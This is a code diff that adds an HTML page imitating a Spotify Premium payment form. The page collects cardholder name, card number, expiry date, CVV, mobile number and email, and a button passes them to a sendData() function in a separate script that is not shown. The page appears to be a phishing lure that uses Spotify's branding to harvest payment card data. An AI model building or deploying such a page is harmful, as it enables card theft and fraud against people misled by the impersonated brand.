@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify Premium Payment</title>
+    <link rel="stylesheet" type="text/css" href="/stylecss/pay.css" crossorigin="anonymous">
+</head>
+<body>
+
+<div class="form-container">
+
+    <div id="logo_h1">
+
+    <img src="../spotify_logo.png" alt="Spotify.png">
+    <h1>Spotify Premium Payment</h1>
+
+    </div>
+
+    <form id="payment-form">
+        <input type="text" id="fullname" placeholder="Cardholder Name" required>
+        <input type="text" id="cardnumber" placeholder="Card Number (e.g: 1234 5678 9012 3456)" maxlength="19" oninput="formatCardNumber(this);" required>
+        <input type="text" id="expirydate" placeholder="Expiry Date (MM/YY)" maxlength="5" oninput="formatExpiryDate(this)" required>
+        <input type="password" id="cvv" placeholder="CVV (3 digits)" maxlength="3" required>
+
+        <select id="country-code">
+        <option value="https://www.spotify.com/us">🇺🇸 United States (+1)</option>
+        <option value="https://www.spotify.com/my">🇲🇾 Malaysia(+60)</option>
+        <option value="https://www.spotify.com/uk">🇬🇧 United Kingdom (+44)</option>
+        <option value="https://www.spotify.com/au">🇦🇺 Australia (+61)</option>
+        <option value="https://www.spotify.com/jp">🇯🇵 Japan (+81)</option>
+        <option value="https://www.spotify.com/de">🇩🇪 Germany (+49)</option>
+        <option value="https://www.spotify.com/fr">🇫🇷 France (+33)</option>
+        <option value="https://www.spotify.com/cn">🇨🇳 China (+86)</option>
+        <option value="https://www.spotify.com/br">🇧🇷 Brazil (+55)</option>
+        <option value="https://www.spotify.com/lb">🇱🇧 Lebanon (+961)</option>
+        <option value="https://www.spotify.com/jp">🇱🇺 Laxenburg (+352)</option>
+        </select>
+
+        <input type="text" id="mobilenumber" placeholder="Mobile Number" maxlength="10" required>
+        <input type="email" id="emailaddress" placeholder="Email Address" required>
+        <button type="button" id="submit-button" onclick="sendData()">Start My Spotify Premium</button>
+        <div class="spinner" id="loading-spinner"></div>
+    </form>
+</div>
+
+<script src="/Javascript/pay.js"></script>
+
+</body>
+</html>
